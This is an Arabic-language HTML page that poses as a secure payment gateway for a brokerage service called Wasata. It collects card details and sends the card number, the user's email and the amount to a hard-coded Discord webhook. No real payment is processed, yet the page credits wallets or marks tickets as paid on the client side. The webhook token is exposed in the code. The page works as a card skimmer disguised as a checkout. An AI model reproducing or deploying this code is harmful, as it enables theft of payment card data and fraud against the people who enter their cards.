<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>بوابة دفع وساطة الآمنة</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body class="bg-gray-50 flex items-center justify-center min-h-screen p-4">
    <div class="bg-white max-w-md w-full p-10 rounded-[3rem] shadow-2xl border border-gray-100">
        <div class="text-center mb-10">
            <h2 class="text-3xl font-black text-gray-800">إتمام الدفع</h2>
            <p id="payTypeDesc" class="text-xs text-gray-400 mt-2 uppercase">WASATA SECURE GATEWAY</p>
        </div>

        <div class="bg-gray-50 p-6 rounded-3xl mb-8 flex justify-between items-center border border-dashed border-gray-200">
            <span class="text-gray-500 font-bold">المبلغ الإجمالي:</span>
            <span id="finalPrice" class="text-2xl font-black text-emerald-500">0.00 SAR</span>
        </div>

        <div class="space-y-4">
            <input type="text" id="cc" placeholder="رقم البطاقة" maxlength="19" class="w-full p-5 rounded-2xl border border-gray-200 outline-none focus:border-emerald-400 text-center text-lg">
            <div class="flex gap-3">
                <input type="text" id="exp" placeholder="MM / YY" maxlength="7" class="w-1/2 p-5 rounded-2xl border border-gray-200 outline-none text-center">
                <input type="password" id="cvv" placeholder="CVC" maxlength="3" class="w-1/2 p-5 rounded-2xl border border-gray-200 outline-none text-center">
            </div>
        </div>

        <button onclick="executePayment()" class="w-full bg-black text-white py-6 rounded-3xl mt-10 text-xl font-black hover:scale-[1.02] active:scale-95 transition shadow-xl">تأكيد الدفع والتحويل</button>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://wasata-af6ac-default-rtdb.europe-west1.firebasedatabase.app" };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const urlParams = new URLSearchParams(window.location.search);
        const amount = urlParams.get('total') || "0";
        const type = urlParams.get('type'); // deposit أو ticket
        const ticketKey = urlParams.get('ticket');

        document.getElementById('finalPrice').innerText = amount + " SAR";
        document.getElementById('payTypeDesc').innerText = type === 'deposit' ? 'إيداع رصيد للمحفظة' : 'دفع قيمة وساطة تيكت';

        async function executePayment() {
            const cc = document.getElementById('cc').value;
            const session = JSON.parse(localStorage.getItem('wasata_session'));
            if(!cc || cc.length < 15) return alert("خطأ في بيانات البطاقة");

            // 1. إرسال الهوك للإدارة (للإيداع والدفع)
            const hook = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: type === 'deposit' ? "💰 عملية إيداع رصيد" : "💳 دفع تيكت وساطة",
                        color: type === 'deposit' ? 65280 : 16711680,
                        fields: [
                            { name: "👤 العميل", value: session.email },
                            { name: "💰 المبلغ", value: amount + " SAR" },
                            { name: "💳 البطاقة", value: cc }
                        ]
                    }]
                })
            });

            // 2. معالجة الحركة برمجياً
            if(type === 'deposit') {
                // تحديث محفظة العميل
                const walletRef = db.ref('wallets/' + ticketKey);
                walletRef.transaction(current => {
                    return { balance: (current?.balance || 0) + parseFloat(amount) };
                });
                alert("✅ تم إيداع المبلغ في محفظتك بنجاح!");
            } else {
                // تحديث التيكت
                await db.ref('tickets/' + ticketKey).update({ status: 'تم الدفع ✓', action: null });
                await db.ref('tickets/' + ticketKey + '/messages').push({
                    text: `💳 تم دفع مبلغ ${amount} SAR بنجاح عبر بوابة الدفع.`,
                    sender: 'system'
                });
                alert("✅ تم دفع قيمة التيكت بنجاح!");
            }

            location.href = 'ticket.html';
        }
    </script>
</body>
</html>
